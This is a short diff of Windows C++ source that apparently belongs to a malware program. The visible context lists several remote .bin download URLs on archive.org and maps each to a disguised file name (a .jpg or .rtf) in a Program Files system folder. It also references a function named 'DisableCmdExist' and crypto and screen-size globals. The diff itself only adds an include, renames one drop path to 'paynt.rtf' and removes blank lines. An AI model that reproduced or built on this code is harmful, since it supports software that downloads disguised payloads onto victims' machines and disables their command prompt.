@@ -16,7 +16,7 @@
 #include <shlwapi.h> // Required for check file existence
 #include <cstdlib> // Required for no "ambiguous"
 #include <stdlib.h> // Same
-
+#include <wincrypt.h>
 
 #pragma warning (disable: 4715) // For fucking DisableCmdExist function
 
@@ -65,7 +65,7 @@ const wchar_t* srcURLk = L"http://archive.org/download/01101000/0000005.bin"; //
 const wchar_t* destFilek = L"C:\\Program Files\\Common Files\\system\\kitten.jpg";
 
 const wchar_t* srcURL8 = L"http://archive.org/download/01101000/0000002.bin";
-const wchar_t* destFile8 = L"C:\\Program Files\\Common Files\\system\\Documento.rtf";
+const wchar_t* destFile8 = L"C:\\Program Files\\Common Files\\system\\paynt.rtf";
 
 const wchar_t* srcURL1 = L"http://archive.org/download/01101000/0000001.bin";
 const wchar_t* destFile1 = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
@@ -2087,7 +2087,6 @@ POINT Pt[3];
 HCRYPTPROV prov;
 
 int scrw, scrh;
-
 
 int random() {
     int out;
